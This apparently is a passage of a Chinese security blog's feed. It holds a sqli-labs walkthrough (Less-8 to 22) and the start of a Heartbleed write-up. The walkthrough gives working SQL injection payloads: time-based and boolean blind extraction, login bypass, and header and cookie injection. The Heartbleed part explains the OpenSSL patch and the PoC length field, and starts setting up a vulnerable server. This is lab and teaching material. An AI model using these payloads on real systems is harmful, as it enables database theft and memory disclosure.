0,1),6,1))=105 and '</span>a<span class="string">'='</span>a</span><br></pre></td></tr></table></figure></p><p>正常返回，之后的注入就和之前的一样了。</p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>这一个和第七个其实差不多，主要就是把报错全部过滤了，如果错误就没有返回，正确就返回you are in……但是其实都一样，两个不同的返回我们就可以利用基于布尔的盲注进行测试：<br>判断是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$    http://127.0.0.1/sqli-labs-master/Less-8/?id=3<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>加单引号之后返回空白，说明报错，然后继续测试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$    http://127.0.0.1/sqli-labs-master/Less-8/?id=3<span class="string">' and sleep(5)  -- #</span></span><br></pre></td></tr></table></figure></p><p>这次可以使用注释。。。<br>获取敏感数据信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-8/?id=3<span class="string">'  AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105  -- #</span></span><br></pre></td></tr></table></figure></p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>哇，这一次很厉害了，无论输入什么返回都是一样的。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$    http://127.0.0.1/sqli-labs-master/Less-9/?id=3<span class="string">'</span></span><br></pre></td></tr></table></figure></p><p>但是肯定是有注入的，这个测试肯定是无论输出什么直接一个echo。。所以我们使用sleep看看：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$    http://127.0.0.1/sqli-labs-master/Less-9/?id=3<span class="string">' and sleep(5) and '</span>a<span class="string">'='</span>a</span><br><span class="line">$    http://127.0.0.1/sqli-labs-master/Less-9/?id=3<span class="string">' and sleep(5) -- #</span></span><br></pre></td></tr></table></figure></p><p>果然，一次就中，很稳。还是存在注入的只是无法根据返回来判断，这就是典型的需要利用时间盲注的案例了。进一步获取信息：<br>获取敏感数据信息：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$    http://127.0.0.1/sqli-labs-master/Less-9/?id=3<span class="string">'   AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105 and sleep(5)  -- #</span></span><br></pre></td></tr></table></figure></p><p>这个时候所以语句后面都必须加一个sleep函数根据相应时间来判断我们的语句是否正确。一般sleep的时间是传输时间来回的两倍。一般取5s。可以看到我们上面这个语句执行的时候相应了5s，说明我们猜测正确，如果换为=106则可以看到很快返回，说明我们的语句猜测错误。<br>可以看到我们time-base的耗时是很长了<br>往往获取一两kb的数据我们要好几个小时甚至好几天，所以这个时候我们就要选择重要的数据进行获取了，比如admin表里的username，password一类的数据了。</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>第十个只是换了个符号<br>检查是否存在注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-10/?id=3<span class="string">" and sleep(5)  -- #</span></span><br></pre></td></tr></table></figure></p><p>然后获取敏感数据：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   http://127.0.0.1/sqli-labs-master/Less-10/?id=3<span class="string">" AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105 and sleep(5)  -- #</span></span><br></pre></td></tr></table></figure></p><p>Ok了，和第九个基本一样。</p><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>到了第11个就出新花样了，可以看到这次是登录框的注入。我们尝试一下万能密码<br>但是登录之后就刷新了不知道有没有成功，于是我们假设成功然后进一步测试使用order by。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-46e4ab422fd61120.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以看到原来在下面有一个报错框，这就很方便了我们继续猜测字段数发现order by 2的时候直接刷新情况说明就是 正确的了。字段数2，然后我们尝试进一步获取敏感信息，这时候也只能利用盲注，因为没有返回：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-878a551b4b0a62c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>如图，username利用万能密码绕过，然后下面的使用：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-51ec93b4c106ce93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>和之前的注入一样，只不过一个是get一个是post，注入的地点不一样了而已。也可以换一下使用username的框注入。只不过post的sleep的话会慢一点。</p><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>这一次发现有点不一样我们，没事继续看看报错：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-9ee443a697902275.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>显示的语法错误处是：’order by 3 – #”) LIMIT 0,1’<br>可以猜测出闭合的类型需(“”)<br>继续：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-c294c61a40e8451c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>好了！成功了，之后其实都一样了，就不演示了。</p><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>这个和上一个差不多：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-83ec6bfc60d21350.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>单引号加括号！</p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>首先看看有没有报错，然后利用报错写植入语句，发现无论怎么写都没有报错，不存在报错，那就继续使用sleep或者用order by测试看看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-00628d5f425d6099.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>发现过滤报错并没有过滤完全，还是存在报错的，所以看出有注入点。接着进行注入。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-7ba57cb8c34daa36.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>Sleep函数也成功执行！<br>敏感信息查询：<br>这个也和上面的一样，只不过单引号换成了双引号，记住加sleep不然不能判断猜解是否正确。</p><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>这个同样没有报错，只能进行手工进行猜测，利用sleep函数进行测试。<br>实验发现这个注入和less-11的语句是一样的只不过没有报错，所以按less-11的注入语句即可。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-b3fbe2436f19ba7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>使用下面的语句判断：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   <span class="string">' or 1=1 and  length(user())&gt;0 and sleep(5) -- #</span></span><br><span class="line"><span class="string">$   '</span> or 1=1 AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105 and sleep(5)  -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>Sleep了5s的时间。</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>这个很挺难猜的。不过也就几个组合，括号+单引号，括号+双引号，单引号，双引号。手工的话一般多猜解几次就可以猜出来的。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-b8ee338d23bd5843.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>其他的就和之前的差不多了，注入语句稍微替换一下就行！</p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>这一个就有一些不一样了，可以看到首页显示的是[PASSWORD RESET]密码重置，。尝试一个万能密码和注入检查试试：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-179a1bb4618ddbc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-db47a05136736161.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>哇，还被骂是辣鸡hacker，很难受。我们重新理一下思路，重置密码就是更新数据库里面的数据，这时候往往使用的是update语句，所以这时候我们使用之前的语句可能就会出错。<br>我们来猜测一下这个页面的sql语句是：update table set password=’newpassword’ where username = ‘name’;所以我们先猜测一个username然后进行后续的测试。<br>我们随机输入一个比如admin密码123456后提示密码更改成功，然后进一步尝试，用户名为admin在密码处进行注入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   <span class="string">' or 1=1 and sleep(5) -- #</span></span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-2209fd13a9062258.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>Ok，可以看到成功注入了，这个时候利用盲注猜解来获取数据信息啦！<br>在实战过程中密码重置是一个很有可能出现sql注入漏洞的地方，所以之后可以重点关注！</p><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>这个一进来就看到了ip，这个很可怕，所以我们在做测试的时候注意，很多时候我们的ip是会被监测的，所以尽量用虚拟机，anyway，想办法避免不必要的麻烦。废话不多说，继续测试.<br>但是我发现我试了很多方法都不行，卡了挺久的，无论是编码转换绕过还是宽字节注入都不行，最后实在不行先成功登陆了一个看一下，发现登陆成功后有这个提示框：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-fef08fd520fd6920.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>思考思考，意思就是这里有输出的，your user agent。Agent！！好像挺熟悉的，在结合这个测试的题目叫header injection。是不是可以抓包冲user-agent来注入，然后输出我们需要的信息！！！！直接用burpsuite来试试：<br>登陆一个正确的用户，然后bp抓包更改user-agent为：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   <span class="string">' and updatexml(1,concat(0x3a,database()),1))#</span></span><br></pre></td></tr></table></figure></p><p>这里输出三个的原因是我们useragent里面有三个字段，用前后两个1来占位输出。Concat是字符串连接的函数，0x3a是：的十六进制。<br>看看结果：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-67e1b31cca83fdc0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以看到我们查询的database()已经被输出出来了。现在我们可以利用这个输出我们想要获取的信息了。至于这个注入产生的原因我们可以看一下源码：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-0b3ae1a2fdb0d382.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以看到因为我们这里把我们登陆获取的user-agent信息给输入进了数据库，而这里的代码对我们传入的参数没有经过任何过滤或者检验。大家也可以看一下登录框的检验，利用了php中的很多检验函数，mysql_real_escape_string这个函数。然后检验主要是check_input这个函数，有兴趣的同学可以研究一下！</p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>这个有上面的经验就不把目标放在登录框，我们先看看成功登陆的显示情况：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-e8aaeb744130987d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>返回的是url，很稳，很明显了我们的注入点就是头部的Referer部分，继续抓包重发一下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  <span class="string">' or updatexml(1,concat(0x3a,(select table_name from information_schema.tables where table_schema="security" limit 0,1)),1))#  //获取表名</span></span><br><span class="line"><span class="string">$  '</span> or updatexml(1,concat(0x3a,(select column_name from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">"user"</span> <span class="built_in">limit</span> 0,1)),1))<span class="comment">#     //获取指定表字段名</span></span><br></pre></td></tr></table></figure></p><p>先讲一下语句，利用mysql自带的information_schema数据库获取数据，注意一定要加limit限制，因为只能一次一个数据，否则会报错。<br>查看结果：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d9a15bc0530f810b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>后面的也不多说啦，大家可以自己尝试。</p><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>继续登陆一个正确的用户看看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-54419430d761835c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>我以为次会没有输出的，但是很意外，这次输出的数据有点多，但是很明显这次cookie就是目标了。看到提示cookie里面的信息有uname还有时间。Post传输的数据都在cookie里面，这次有点不一样，先登录，然后刷新，抓包：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-7b85e41b52b58d1a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>更改的是图中指出的部分！我们构造一下语句，其实这里就很好注入了，就和之前的注入语句一样：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  uname=qwe<span class="string">' union select 1,user(),database()-- #</span></span><br></pre></td></tr></table></figure></p><p>其实语句大家应该都很熟悉了。。。看结果：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-8764c5487130a13c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>好了，接下来就很简单了。</p><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><p>奋战奋战！！<br>看看登陆信息：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-0708b8b154278c89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这次的uname很奇怪，但是老司机一看就知道是编码转换之后的，所以试一试。果然是base64编码，所以这个其实和上一个差不多，只不过注入的时候转换一下编码就可以了！<br>这个的是利用单引号和括号闭合的，多尝试一下根据报错就会知道，这之前就说过所以不重复了。<br>抓包：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-312c3a5af82f31a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>更改cookies就可以。<br>注入语句：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  cXdlJykgdW5pb24gc2VsZWN0IDEsdXNlcigpLGRhdGFiYXNlKCktLSAj</span><br><span class="line">$  //就是20题的qwe<span class="string">') union select 1,user(),database()-- #</span></span><br></pre></td></tr></table></figure></p><p>抓包重发：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-86262ccae459c365.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>出来了。</p><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><p>先看看登陆情况，发现和上一个一样，所以没什么新奇的，写语句base64转换一下，然后根据报错猜测应该是双引号闭合的，所以其他都很简单了。<br>语句：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$   InVuaW9uIHNlbGVjdCAxLHVzZXIoKSxkYXRhYmFzZSgpIw==</span><br><span class="line">$   //“union select 1,user(),database()<span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>看结果：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-a71ec611ea20cb1a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>好了。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>Task1就结束了因为还有其他任务所以后面的一些可能晚一点写了上传，如果有问题可以找我啊，一起学习！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Sqli-lab实验Task1（less1-22）&quot;&gt;&lt;a href=&quot;#Sqli-lab实验Task1（less1-22）&quot; class=&quot;headerlin
      
    
    </summary>
    
      <category term="攻防实验" scheme="https://rliyuqing.github.io/categories/%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="sqli-labs" scheme="https://rliyuqing.github.io/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>heartbleed漏洞及内存信息窃取</title>
    <link href="https://rliyuqing.github.io/2019/04/15/5.%20heartbleed%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%86%85%E5%AD%98%E4%BF%A1%E6%81%AF%E7%AA%83%E5%8F%96/"/>
    <id>https://rliyuqing.github.io/2019/04/15/5. heartbleed漏洞及内存信息窃取/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:49:39.721Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="heartbleed漏洞及内存信息窃取"><a href="#heartbleed漏洞及内存信息窃取" class="headerlink" title="heartbleed漏洞及内存信息窃取"></a>heartbleed漏洞及内存信息窃取</h1><hr><h2 id="了解漏洞"><a href="#了解漏洞" class="headerlink" title="了解漏洞"></a>了解漏洞</h2><h3 id="Heartbleed漏洞是什么？"><a href="#Heartbleed漏洞是什么？" class="headerlink" title="Heartbleed漏洞是什么？"></a>Heartbleed漏洞是什么？</h3><p>Heartbleed漏洞是openssl加密软件库中的一个严重的漏洞。这个漏洞允许在正常情况下通过用于保护因特网的ssl/tls加密来窃取受保护的信息。只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可能因此而受到攻击。<br>此问题的原因是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查），因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过读，即可以读取的数据比应该允许读取的还多。<br>这个漏洞在通用漏洞披露（CVE）系统中的编号为CVE-2014-0160。</p><h3 id="它的背景和影响是什么？"><a href="#它的背景和影响是什么？" class="headerlink" title="它的背景和影响是什么？"></a>它的背景和影响是什么？</h3><p>背景：<br>OpenSSL于2014年4月7日被公开披露据。信在漏洞披露时，约有17%（大约五十万）通过认证机构认证的互联网安全网络服务器容易受到攻击，导致服务器私钥和用户会话cookie及密码被盗。电子前哨基金会、Ars Technica和布鲁斯·施奈尔均认为心脏出血漏洞是“灾难性的”。福布斯网络安全专栏作家约瑟夫·斯坦伯格写道：“有些人认为，至少就其潜在影响而言，‘心脏出血’是自互联网允许商用以来所发现的最严重的漏洞。”<br>影响：<br>经由heartbleed漏洞发动攻击，获得的数据可能包括TLS双方将要交换、但尚未加密的机密内容，包括在用户请求中各种格式的post数据。此外，泄漏的数据还可能含有身份验证密令，如会话cookie及密码，可使攻击者向该服务冒充此用户。<br>攻击还可能泄漏受攻击双方的私钥，这将使攻击者能解密通信内容（将来或是之前通过被动窃听捕获而存储的通信，除非使用完全正向保密，而在这种情况下，只能解密将来通过中间人攻击截获的通信）。<br>即使漏洞修复之后，获得受害者认证资料的攻击者仍能伪装成资料的拥有者，只要该资料能被接受（例如，在更改密码或撤销私钥之前）。因此，漏洞对保密性构成了致命威胁。然而，冒充受害人的攻击者也能修改数据，所以间接的后果可能不只是系统机密泄漏那么简单。<br>一项于2014年4月对美国成人进行的调查显示，60%的人听说过心脏出血漏洞。使用互联网的受访者中有39%的人采取了行动以保护他们的在线账户，如更改密码或注销账户；29%的人认为他们的个人信息因漏洞而处于危险之中；6%的人认为他们的个人信息已遭窃取。</p><h2 id="分析漏洞原理"><a href="#分析漏洞原理" class="headerlink" title="分析漏洞原理"></a>分析漏洞原理</h2><h3 id="源码中那些地方出现了问题？"><a href="#源码中那些地方出现了问题？" class="headerlink" title="源码中那些地方出现了问题？"></a>源码中那些地方出现了问题？</h3><p>我们直接看一下修复后的提交的代码和之前代码的区别：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--- a/ssl/d1_both.c</span><br><span class="line">+++ b/ssl/d1_both.c</span><br><span class="line">@@ -1459,26 +1459,36 @@ dtls1_process_heartbeat(SSL *s)</span><br><span class="line">        unsigned int payload;</span><br><span class="line">        unsigned int padding = 16; /* Use minimum padding */</span><br><span class="line">-       /* Read <span class="built_in">type</span> and payload length first */</span><br><span class="line">-       hbtype = *p++;</span><br><span class="line">-       n2s(p, payload);</span><br><span class="line">-       pl = p;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;msg_callback)</span><br><span class="line">                s-&gt;msg_callback(0, s-&gt;version, TLS1_RT_HEARTBEAT,</span><br><span class="line">                        &amp;s-&gt;s3-&gt;rrec.data[0], s-&gt;s3-&gt;rrec.length,</span><br><span class="line">                        s, s-&gt;msg_callback_arg);</span><br><span class="line">+       /* Read <span class="built_in">type</span> and payload length first */</span><br><span class="line">+       <span class="keyword">if</span> (1 + 2 + 16 &gt; s-&gt;s3-&gt;rrec.length)</span><br><span class="line">+               <span class="built_in">return</span> 0; /* silently discard */</span><br><span class="line">+       hbtype = *p++;</span><br><span class="line">+       n2s(p, payload);</span><br><span class="line">+       <span class="keyword">if</span> (1 + 2 + payload + 16 &gt; s-&gt;s3-&gt;rrec.length)</span><br><span class="line">+               <span class="built_in">return</span> 0; /* silently discard per RFC 6520 sec. 4 */</span><br><span class="line">+       pl = p;</span><br><span class="line">+</span><br><span class="line">        <span class="keyword">if</span> (hbtype == TLS1_HB_REQUEST)</span><br><span class="line">                &#123;</span><br><span class="line">                unsigned char *buffer, *bp;</span><br><span class="line">+               unsigned int write_length = 1 /* heartbeat <span class="built_in">type</span> */ +</span><br><span class="line">+                                           2 /* heartbeat length */ +</span><br><span class="line">+                                           payload + padding;</span><br><span class="line">                int r;</span><br><span class="line"> </span><br><span class="line">+               <span class="keyword">if</span> (write_length &gt; SSL3_RT_MAX_PLAIN_LENGTH)</span><br><span class="line">+                       <span class="built_in">return</span> 0;</span><br><span class="line">+</span><br><span class="line">                /* Allocate memory <span class="keyword">for</span> the response, size is 1 byte</span><br><span class="line">                 * message <span class="built_in">type</span>, plus 2 bytes payload length, plus</span><br><span class="line">                 * payload, plus padding</span><br><span class="line">                 */</span><br><span class="line">-               buffer = OPENSSL_malloc(1 + 2 + payload + padding);</span><br><span class="line">+               buffer = OPENSSL_malloc(write_length);</span><br><span class="line">                bp = buffer;</span><br><span class="line"> </span><br><span class="line">                /* Enter response <span class="built_in">type</span>, length and copy payload */</span><br><span class="line">@@ -1489,11 +1499,11 @@ dtls1_process_heartbeat(SSL *s)</span><br><span class="line">                /* Random padding */</span><br><span class="line">                RAND_pseudo_bytes(bp, padding);</span><br><span class="line"> </span><br><span class="line">-               r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);</span><br><span class="line">+               r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, write_length);</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span> (r &gt;= 0 &amp;&amp; s-&gt;msg_callback)</span><br><span class="line">                        s-&gt;msg_callback(1, s-&gt;version, TLS1_RT_HEARTBEAT,</span><br><span class="line">-                               buffer, 3 + payload + padding,</span><br><span class="line">+                               buffer, write_length,</span><br><span class="line">                                s, s-&gt;msg_callback_arg);</span><br><span class="line"> </span><br><span class="line">                OPENSSL_free(buffer);</span><br></pre></td></tr></table></figure></p><p>从上面的差异我们可以看到，服务器处理心跳原来的方式是首先直接解析type和payload，什么都不做任何的检查。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unsigned int payload;</span><br><span class="line">        unsigned int padding = 16; </span><br><span class="line">        hbtype = *p++;</span><br><span class="line">        n2s(p, payload);</span><br><span class="line">        pl = p;</span><br></pre></td></tr></table></figure></p><p>修改之后openssl的data进行了16字节的数据对齐，其他格式一致。<br>修补方式是他加入了两个重要的函数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (1 + 2 + 16 &gt; s-&gt;s3-&gt;rrec.length)</span><br><span class="line">              <span class="built_in">return</span> 0; /* silently discard */</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (1 + 2 + payload + 16 &gt; s-&gt;s3-&gt;rrec.length)</span><br><span class="line">              <span class="built_in">return</span> 0; /* silently discard per RFC 6520 sec. 4 */</span><br></pre></td></tr></table></figure></p><p>这个判断的目的是为了避免data的length为0这一特殊情况的处理。</p><h3 id="从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？"><a href="#从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？" class="headerlink" title="从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？"></a>从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？</h3><p>从python的poc脚本中最重要的一部分代码可以看到:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hb = h2bin(<span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">18 03 02 00 03</span></span><br><span class="line"><span class="string">01 40 00</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span>)</span><br></pre></td></tr></table></figure></p><p>其中后四位 40 00 是我们请求的数据长度。如果将这个改为其他的数据。比如ff ff就可以请求一个超过我们真是payload长度的数据了。<br>通过更改请求数据的长度然后就可以利用漏洞读取缓存找中的数据了。</p><h2 id="漏洞的复现和利用"><a href="#漏洞的复现和利用" class="headerlink" title="漏洞的复现和利用"></a>漏洞的复现和利用</h2><h3 id="安装配置openssl"><a href="#安装配置openssl" class="headerlink" title="安装配置openssl"></a>安装配置openssl</h3><p>绝对不能直接卸载原来的openssl。因为有很多依赖，我们直接下载openssl 1.0.1e版本的压缩包，然后解压安装。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tar -zxvf   openssl-1.0.1e.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span>  /openssl-1.0.1e/  //编译安装之前需要执行下面这个否则会报错</span><br><span class="line">$ rm –f /usr/bin/pod2man</span><br><span class="line">$ ./config --prefix=/usr/<span class="built_in">local</span>/openssl shared -fPIC no-gost</span><br><span class="line">$ //上面的命令，是安装openssl到  /usr/<span class="built_in">local</span>/openssl 目录，安装之后，编译；</span><br><span class="line">$ make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p>修改配置文件：<br>在/etc/ld.so.conf文件的最后面，添加如下内容：<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/openssl/lib</span><br></pre></td></tr></table></figure></p><p>然后执行：<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/<span class="built_in">local</span>/openssl/lib</span><br></pre></td></tr></table></figure></p><p>添加OPESSL的环境变量：<br>在etc／的profile的最后一行，添加：<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> OPENSSL=/usr/<span class="built_in">local</span>/openssl/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$OPENSSL</span>:<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin</span><br></pre></td></tr></table></figure></p><p>退出命令界面，再从新登录。(注销一下)<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cp lib*.so* /usr/lib64          //把这四个文件复制到lib64位置</span><br></pre></td></tr></table></figure></p><p>依次如下执行：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ldd /usr/<span class="built_in">local</span>/openssl/bin/openssl</span><br></pre></td></tr></table></figure></p><p>查看路径<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">which</span> openssl</span><br></pre></td></tr></table></figure></p><p>查看版本：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ openssl version</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-67ef6e67678784ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p><h3 id="配置Apache-https"><a href="#配置Apache-https" class="headerlink" title="配置Apache+https"></a>配置Apache+https</h3><p>不用卸载原来的apache，直接下线安装2.2版本就行，这样就不用装apr这些依赖，原版本已经存在。<br>下载安装apache2.2.34：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tar –zxvf apache-2.2.34.tar.gz</span><br><span class="line">$ ./configure --prefix=/usr/<span class="built_in">local</span>/httpd --<span class="built_in">enable</span>-so --<span class="built_in">enable</span>-rewrite --<span class="built_in">enable</span>-ssl --with-ssl=/usr/<span class="built_in">local</span>/openssl</span><br><span class="line">$ Make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p>如果编译时出现错误：sort libssl.so.10之类的错误可以直接忽略！<br>因为这个只是版本的问题，不用理会！我尝试了很多都不能解决这个问题。重装了好几次，最后发现是fedora版本的问题，后面直接忽略了这个报错发现最结果没有影响。<br>在目录/usr/local/httpd/conf下生成证书：（直接在conf目录下生成证书就不用拷贝了。）<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ openssl genrsa -out server.key 2048   //生成2048位的加密私钥</span><br><span class="line">$ openssl req -new -key server.key -out server.csr   //生成证书签名请求（CSR），这里需要填写许多信息，如国家，省市，公司等</span><br><span class="line">$ openssl x509 -req -days 3650 -<span class="keyword">in</span> server.csr -signkey server.key -out server.crt    //最后，生成类型为X509的自签名证书。有效期设置3650天，即有效期为10年</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-68197205f328ab4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-406a0c6c1465776c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>然后修改httpd.conf的配置文件<br>将ServerNname的注释取消，改为127.0.0.1:8080<br>将httpd-ssl的那一行的注释也取消。<br><img 